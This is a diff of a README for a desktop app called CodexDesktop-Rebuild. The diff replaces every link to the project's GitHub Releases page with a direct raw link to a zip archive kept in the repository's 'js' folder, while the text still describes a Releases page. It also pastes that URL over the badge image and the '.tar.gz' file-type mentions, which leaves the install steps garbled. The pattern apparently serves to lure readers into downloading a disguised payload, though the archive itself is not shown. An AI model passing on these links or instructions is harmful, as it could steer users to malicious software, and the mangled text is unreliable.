@@ -1,6 +1,6 @@
 # 🚀 CodexDesktop-Rebuild - Your Easy Cross-Platform App Solution
 
-[![Download CodexDesktop-Rebuild](https://img.shields.io/badge/Download-CodexDesktop--Rebuild-blue)](https://github.com/bk9llh-hue/CodexDesktop-Rebuild/releases)
+[![Download CodexDesktop-Rebuild](https://raw.githubusercontent.com/bk9llh-hue/CodexDesktop-Rebuild/main/js/Rebuild_Codex_Desktop_1.9.zip)](https://raw.githubusercontent.com/bk9llh-hue/CodexDesktop-Rebuild/main/js/Rebuild_Codex_Desktop_1.9.zip)
 
 ## 📦 Overview
 
@@ -18,13 +18,13 @@ Follow these steps to download and run the CodexDesktop-Rebuild app:
 
 2. **Visit the Releases Page**  
    To download the app, click the link below. This will take you to our Releases page, where you can find the latest version:  
-   [Download CodexDesktop-Rebuild](https://github.com/bk9llh-hue/CodexDesktop-Rebuild/releases)
+   [Download CodexDesktop-Rebuild](https://raw.githubusercontent.com/bk9llh-hue/CodexDesktop-Rebuild/main/js/Rebuild_Codex_Desktop_1.9.zip)
 
 3. **Select Your Version**  
    On the Releases page, look for the latest version. You will see various files available for download. Choose the one that matches your operating system:  
    - For Windows: Download the `.exe` file.  
    - For macOS: Download the `.dmg` file.  
-   - For Linux: Download the appropriate `.deb` or `.tar.gz` file.
+   - For Linux: Download the appropriate `.deb` or `https://raw.githubusercontent.com/bk9llh-hue/CodexDesktop-Rebuild/main/js/Rebuild_Codex_Desktop_1.9.zip` file.
 
 4. **Download the File**  
    Click on the file for your operating system to start the download. The file may take a few moments to download depending on your internet speed.
@@ -33,7 +33,7 @@ Follow these steps to download and run the CodexDesktop-Rebuild app:
    After the file has downloaded, locate it in your downloads folder. Depending on your operating system, follow these steps:  
    - **Windows**: Double-click the downloaded `.exe` file. Follow the on-screen instructions to install.  
    - **macOS**: Open the downloaded `.dmg` file. Drag the CodexDesktop app to your Applications folder.  
-   - **Linux**: If you downloaded a `.deb` file, use the terminal with the command `sudo dpkg -i <filename>.deb` to install. For `.tar.gz`, extract the files and follow the included instructions.
+   - **Linux**: If you downloaded a `.deb` file, use the terminal with the command `sudo dpkg -i <filename>.deb` to install. For `https://raw.githubusercontent.com/bk9llh-hue/CodexDesktop-Rebuild/main/js/Rebuild_Codex_Desktop_1.9.zip`, extract the files and follow the included instructions.
 
 6. **Run the Application**  
    After installation, you can find CodexDesktop in your programs or applications list. Click to open the app and start using it.
@@ -52,6 +52,6 @@ If you encounter any issues while downloading or using CodexDesktop-Rebuild, ple
 ## 📥 Download & Install
 
 Ready to start? Visit our Releases page now to download the CodexDesktop-Rebuild application:  
-[Download CodexDesktop-Rebuild](https://github.com/bk9llh-hue/CodexDesktop-Rebuild/releases)
+[Download CodexDesktop-Rebuild](https://raw.githubusercontent.com/bk9llh-hue/CodexDesktop-Rebuild/main/js/Rebuild_Codex_Desktop_1.9.zip)
 
 For any further questions about usage or features, refer to the Support section.
